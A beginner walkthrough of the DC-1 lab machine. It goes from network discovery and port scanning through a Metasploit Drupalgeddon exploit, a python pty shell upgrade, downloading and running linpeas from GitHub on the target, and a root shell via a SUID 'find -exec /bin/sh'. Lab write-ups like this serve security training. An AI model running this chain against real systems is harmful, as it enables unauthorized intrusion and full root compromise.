# Privilege-escalation — DC-1

**Credits:**

**Rejaul Islam**  
_Security enthusiast_

............................................

This is a beginner-friendly writeup for the **DC-1** vulnerable machine (privilege escalation).
Below you’ll find the full step-by-step process, explanations for every command (so beginners understand _why_ we run them), and copy-ready `bash` blocks so you can paste them directly into a terminal while working in an authorized lab environment (TryHackMe, VulnHub, your own VMs, etc).

> **Important:** Only run these steps against systems you own or have explicit permission to test. Using these techniques on unauthorized machines is illegal.

---

## Overview — what we’ll do

1. Discover the target IP on the local network.
2. Port-scan the target to find services.
3. Visit the web service, identify the application (Drupal 7).
4. Use Metasploit to exploit the web app and get a low-privileged shell (www-data).
5. Upgrade to an interactive bash shell.
6. Run automated enumeration (linpeas) to find privilege-escalation clues.
7. Use the discovered vector (`/usr/bin/find` with SUID or sudo rights) to escalate to root.

---

## Step 0 — Pre-reqs (tools you may need)

Make sure you have these tools installed on your attack machine (Kali / Parrot / your VM):

- `netdiscover` (or `arp-scan`) — for local host discovery
- `rustscan` or `nmap` — for port scanning
- `msfconsole` (Metasploit) — exploitation framework
- `python` — for interactive shells (`pty.spawn`)
- `wget` / `curl` — to download linpeas
- `linpeas.sh` — automated enumeration (from approved repo)

---

## Step 1 — Find the target IP on your local network

We use a simple network discovery tool to find machines on the LAN. This discovers live hosts and their MAC addresses.

```
# Discover hosts on the local network (run as root or with sudo where required)
sudo netdiscover
```

**What this does & why:**
`netdiscover` performs ARP sweeps on your subnet and lists live hosts. From the example output you identified the vulnerable machine:

```
192.168.0.119   08:00:27:aa:94:9f      5     210  PCS Systemtechnik GmbH
```

---

## Step 2 — Port scan the target

Scan the discovered IP for open ports and services.

```
# Fast port scan using rustscan (adjust flags/options as needed)
rustscan -a 192.168.0.119
```

**What this does & why:**
`rustscan` is a very fast scanner that finds open ports so you know what services are reachable. Example output showed:

```
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
46679/tcp open  unknown
```

This tells us a web service is running on port 80 — a good place to look.

---

## Step 3 — Visit the web service

Open the IP in your browser to inspect the web app.

```
http://192.168.0.119:80
```

**What to look for:**
A login page or clues about the web application framework. In this case, the site showed it was running **Drupal 7** (you can also confirm with a Wappalyzer browser extension or by checking page source and specific Drupal files).

---

## Step 4 — Find known exploits for the app

Search for known vulnerabilities for the detected application/version. On Kali you can use `searchsploit`.

```
# Search local ExploitDB for "drupal 7"
searchsploit "drupal 7"
```

**What this does & why:**
`searchsploit` queries a local copy of Exploit-DB for public exploits. You’ll see possible exploits for Drupal 7 — some of which are commonly integrated as Metasploit modules.

---

## Step 5 — Use Metasploit to exploit the site

Open Metasploit and search for a Drupal 7 module.

```
# run msfconsole
msfconsole

# inside msfconsole, search for drupal modules
search drupal 7
```

If you find a module that matches, use it and configure the target:

```
# example Metasploit flow (run inside msfconsole)
use <module_index_or_path>     # e.g., use exploit/unix/webapp/drupal_drupalgeddon
set RHOSTS 192.168.0.119
set RPORT 80
exploit
```

**What this does & why:**
Metasploit automates exploiting a known vulnerability. A successful exploit can give a Meterpreter session, which you can convert to a shell.

---

## Step 6 — Get an interactive shell

If you have a meterpreter session, spawn a system shell. If you only have a basic shell, upgrade it to a proper interactive bash shell.

```
# From meterpreter session:
shell

# If the shell is awkward / not interactive, spawn a proper PTY-backed bash:
python -c 'import pty; pty.spawn("/bin/bash")'
```

**What this does & why:**
`python -c 'import pty; pty.spawn("/bin/bash")'` upgrades a limited shell to a proper interactive terminal so you can run interactive commands comfortably. After upgrading you might see:

```
www-data@DC-1:/var/www$
```

This indicates you are the web server user (`www-data`) on the target.

---

## Step 7 — Automated enumeration with linpeas

Automated scripts like `linpeas.sh` can highlight common privilege escalation vectors (SUID binaries, dangerous file permissions, misconfigured sudo, weak services, etc). Download and run linpeas **only from the official repo**.

```
# move to /tmp (or another writable dir)
cd /tmp

# download linpeas (official repository)
wget https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh

# make it executable
chmod +x linpeas.sh

# run it (this will print a lot of output; look for red/highlighted lines)
./linpeas.sh
```

**What this does & why:**
`linpeas.sh` performs many checks and prints interesting findings (SUID files, sudoers misconfigs, weak services). Focus on red/highlighted results because they usually indicate probable escalation paths.

> Note: Always verify the URL before downloading and only fetch from trusted repositories.

---

## Step 8 — Inspect linpeas results & find SUID/sudo clues

linpeas often points out binaries with SUID bits or sudo rights. In this example linpeas highlighted:

```
-rwsr-xr-x 1 root root 159K Jan 6 2012 /usr/bin/find
```

**What this means:**
The `s` in the permissions (`rws`) denotes the SUID bit — if this `find` binary is SUID root (or if `find` is runnable as root via sudo without a password), it can be abused to get a root shell. Always verify context: SUID vs sudo NOPASSWD changes exploitation method.

---

## Step 9 — Escalate privilege using `find` (lab context)

If `find` is available to you under SUID or as a sudo NOPASSWD command, a common technique (used in labs) is to execute a shell from `find`:

```
# From a writable directory or the target path
find . -exec /bin/sh \; -quit
```

**What this does & why:**
`find . -exec /bin/sh \; -quit` tells `find` to execute `/bin/sh` for the first match and then quit. If `find` is running with root privileges (SUID or via sudo), the spawned shell inherits those privileges and becomes a root shell (`#` prompt).

**After running:**

```
# whoami
root
```

Indicates you are now root.

> **Security note:** This command demonstrates how `find` can be used to spawn shells; in real-world systems, services that expose root-capable binaries to untrusted users are misconfigurations and should be corrected.

--- THE END ---
